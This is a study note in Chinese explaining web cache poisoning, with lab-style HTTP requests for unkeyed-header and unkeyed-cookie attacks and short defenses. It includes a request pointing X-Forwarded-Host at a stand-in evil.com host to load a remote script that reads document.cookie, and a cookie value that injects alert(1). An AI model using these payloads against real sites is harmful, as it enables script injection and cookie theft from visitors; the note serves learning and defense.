# Web Cache Poisoning
## 成因
### Web Cache 問題 
* 藉由鍵值來判斷是否已存在 cache 中，如果存在就從 cache 拿。
* 像是以下請求，藉由 `/blog/post.php?mobile=1` 與 `example.com` 作為鍵。
```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=pl;
Connection: close
```
* 因此以下請求會被視為可以從 cache 中取出。
```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=en;
Connection: close
```
* 但會出現的問題，請求是 `language=en;`，但回應從快取取出因此會是 `language=pl;`
### Web Cache Poisoning
* 攻擊者向伺服器發起惡意請求，使惡意請求的回應儲存於快取伺服器中，導致其他使用者從快取伺服器中得到惡意內容回應。
## 影響
* web cache poisoning，主要影響從快取伺服器取得資料的使用者。
* 頁面受歡迎程度，將會影響範圍。
## 攻擊方法
### unkeyed header
* 可以發現快取回應中 `src="//example.com/..."`，受到我們的 `X-Forwarded-Host` 影響
* `?cb=123` 用來作為測試 cache 的隨機值。
```
GET /?cb=123 HTTP/2
X-Forwarded-Host: example.com
```
```
<script type="text/javascript" src="//example.com/resources/js/tracking.js">
```
* 因此可以藉由此方法在 `evil.com/resources/js/tracking.js` 加入
```
alert(document.cookie)
```
* 之後將 `X-Forwarded-Host` 更改為 `evil.com/resources/js/tracking.js`，然後進行請求，使其存入快取。之後使用者就會引入我們的惡意腳本。
```
GET / HTTP/2
X-Forwarded-Host: evil.com/resources/js/tracking.js
```
### unkeyed cookie
* 一般請求，請求中的 cookie `fehost=prod-cache-01` 寫入回應中 `"frontend":"prod-cache-01"`。
```
GET / HTTP/2
Host: 0a2700490423b42d80524e6a00190035.web-security-academy.net
Cookie: session=jTauCF19hdPFqQmEd0sbMw1ACJmRkCTW; fehost=prod-cache-01
```
```
<script>
    data = {
        "host":"0a2700490423b42d80524e6a00190035.web-security-academy.net",
        "path":"/",
        "frontend":"prod-cache-01"
    }
</script>
```
* 惡意請求，請求中的 cookie `fehost="-alert(1)-"` 寫入回應中執行 `alert(1)`。
```
GET / HTTP/2
Host: 0a2700490423b42d80524e6a00190035.web-security-academy.net
Cookie: session=jTauCF19hdPFqQmEd0sbMw1ACJmRkCTW; fehost="-alert(1)-"
```
```
<script>
    data = {
        "host":"0a2700490423b42d80524e6a00190035.web-security-academy.net",
        "path":"/",
        "frontend":""-alert(1)-""
    }
</script>
```
## 防禦方法
* 關閉未使用的標頭。
* 僅針對靜態檔案做 cache，但也要確保攻擊者不會將其導向惡意靜態檔案。
## 參考
* https://portswigger.net/research/practical-web-cache-poisoning
---
###### tags: `web security`